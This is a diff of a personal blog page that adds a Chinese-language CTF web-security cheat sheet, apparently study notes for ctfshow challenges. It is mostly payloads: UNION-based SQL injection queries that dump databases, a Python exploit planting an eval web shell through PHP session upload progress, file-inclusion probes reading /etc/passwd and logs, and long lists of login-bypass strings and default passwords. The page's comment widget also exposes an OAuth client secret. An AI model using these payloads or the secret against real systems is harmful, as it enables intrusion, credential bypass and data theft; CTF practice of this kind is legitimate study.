@@ -17,20 +17,24 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/tags/"/>
+    <link rel="canonical" href="http://example.com/2024/03/13/ctfweb/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://example.com/tags/index.html">
+        <meta name="description" content="CTF_WEBSQL注入：1、数据库为mysql的爆库、爆表、爆字段、爆值的语句： 爆库： 1union select 1,2,3,database();#查看此处有多字段  爆表： 1union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); #">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfweb">
+<meta property="og:url" content="http://example.com/2024/03/13/ctfweb/index.html">
 <meta property="og:site_name" content="敬请T期待">
+<meta property="og:description" content="CTF_WEBSQL注入：1、数据库为mysql的爆库、爆表、爆字段、爆值的语句： 爆库： 1union select 1,2,3,database();#查看此处有多字段  爆表： 1union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); #">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-01-17T11:58:25.000Z">
-<meta property="article:modified_time" content="2024-01-17T11:58:25.234Z">
+<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">
+<meta property="article:published_time" content="2024-03-13T03:56:35.000Z">
+<meta property="article:modified_time" content="2024-03-13T04:01:07.223Z">
 <meta property="article:author" content="kingwempity">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">
     
     
     <!--- Icon Part-->
@@ -42,7 +46,7 @@
     
     <title>
         
-            Tags -
+            ctfweb -
         
         KingWempity&#39;s Blog
     </title>
@@ -547,127 +551,297 @@
             <div class="main-content">
 
                 
-                    
-<div class="tagcloud-container">
-	<div>
-		<h1 class="tagcloud-header">Tags</h1>
-	</div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
 
-	
-	<div class="tagcloud-content">
-		<ul class="tag-list" data-show-value="true">
-			
-				<li>
-					<a data-weight="1" href="/tags/2024/">
-						<i class="fa-solid fa-hashtag"></i>2024
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/%E4%B9%A6%E5%8D%95/">
-						<i class="fa-solid fa-hashtag"></i>书单
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Love/">
-						<i class="fa-solid fa-hashtag"></i>Love
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Book/">
-						<i class="fa-solid fa-hashtag"></i>Book
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Java/">
-						<i class="fa-solid fa-hashtag"></i>Java
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/">
-						<i class="fa-solid fa-hashtag"></i>项目实战
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Hope-flag/">
-						<i class="fa-solid fa-hashtag"></i>Hope_flag
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Python/">
-						<i class="fa-solid fa-hashtag"></i>Python
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/">
-						<i class="fa-solid fa-hashtag"></i>实战项目
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Web/">
-						<i class="fa-solid fa-hashtag"></i>Web
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/%E5%AE%89%E5%85%A8/">
-						<i class="fa-solid fa-hashtag"></i>安全
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="3" href="/tags/%E7%AC%94%E8%AE%B0/">
-						<i class="fa-solid fa-hashtag"></i>笔记
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/python/">
-						<i class="fa-solid fa-hashtag"></i>python
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Learn/">
-						<i class="fa-solid fa-hashtag"></i>Learn
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/CTF/">
-						<i class="fa-solid fa-hashtag"></i>CTF
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/ctf-show/">
-						<i class="fa-solid fa-hashtag"></i>ctf.show
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/Begin/">
-						<i class="fa-solid fa-hashtag"></i>Begin
-					</a>
-				</li>
-			
-				<li>
-					<a data-weight="1" href="/tags/c/">
-						<i class="fa-solid fa-hashtag"></i>c++
-					</a>
-				</li>
-			
-		</ul>
-	</div>
-	
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">ctfweb</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">敬请T期待</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-13 11:56:35</span>
+        <span class="mobile">2024-03-13 11:56:35</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-13 12:01:07</span>
+            <span class="mobile">2024-03-13 12:01:07</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>945 Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
+<p><strong>爆库：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆表：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆字段：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆值：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>
+
+<p>实战例子：</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png" alt="ctfshow_web6_1"></p>
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
+<p>CTFshow&#x2F; easy_include</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代码解释：</p>
+<blockquote>
+<p>观察cookie，发现自动开启了session，直接session文件包含</p>
+<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
+</blockquote>
+<p>EXP:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>使用php协议</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看PHP下的文夹使用ls</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看文件日志的文件夹</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
+<p> ‘r 1&#x3D;1 #</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号： admin<br> 密码：admin</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin<br> 密码：admin888</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin</p>
+<p> 密码：域名名</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> 1：”or ‘a’&#x3D;”a<br> 2： ‘’)or(‘a’&#x3D;’a<br> 3：or 1&#x3D;1-<br> 4：’or 1&#x3D;1-<br> 5：a’or’ 1&#x3D;1-<br> 6：”or 1&#x3D;1-<br> 7：’or’a’&#x3D;’a<br> 8：”or”&#x3D;”a’&#x3D;’a<br> 9：’or”&#x3D;’<br> 10：’or’&#x3D;’or’<br> 11: 1 or ‘1’&#x3D;’1’&#x3D;1<br> 12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> 13: ‘OR 1&#x3D;1%00<br> 14: “or 1&#x3D;1%00<br> 15: ‘xor## PHP万能密码</p>
+<p> ‘or’&#x3D;’or’</p>
+<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
+<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
+<p> jsp 万能密码</p>
+<p> 1’or’1’&#x3D;’1</p>
+<p> admin’ OR 1&#x3D;1&#x2F;*</p>
+<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
+</blockquote>
+<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
+<p>a’ or true #</p>
+<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
+</blockquote>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
+<hr>
+<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
+<blockquote>
+<ol>
+<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
+<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
+<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
+<li><code>-</code>：匹配破折号字符。</li>
+<li><code>\\</code>：匹配反斜杠字符。</li>
+<li><code>\/</code>：匹配正斜杠字符。</li>
+<li><code>\\*</code>：匹配星号字符。</li>
+<li><code>\&lt;</code>：匹配单词的开头。</li>
+<li><code>\&gt;</code>：匹配单词的结尾。</li>
+<li><code>\!</code>：匹配感叹号字符。</li>
+<li><code>x</code>：匹配字母 ‘x’。</li>
+<li><code>hex</code>：匹配字符串 ‘hex’。</li>
+<li><code>\(</code>：匹配左括号。</li>
+<li><code>\)</code>：匹配右括号。</li>
+<li><code>\+</code>：匹配加号。</li>
+<li><code>select</code>：匹配字符串 ‘select’。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ctfweb</li>
+        <li><strong>Author:</strong> 敬请T期待</li>
+        <li><strong>Created at
+                :</strong> 2024-03-13 11:56:35</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-03-13 12:01:07
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kingwempity.github.io/2024/03/13/ctfweb/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/02/20/ctf-show-web/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">ctf.show_web</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'fccf7af8f3c022b90387',
+                    clientSecret: 'fc7f407a40b2244ed04f721d84d4f860971603fa',
+                    repo: 'gitalk',
+                    owner: 'kingwempity',
+                    admin: ['kingwempity'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/kingwempity/gitalk.git'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
 </div>
 
 
@@ -756,6 +930,23 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
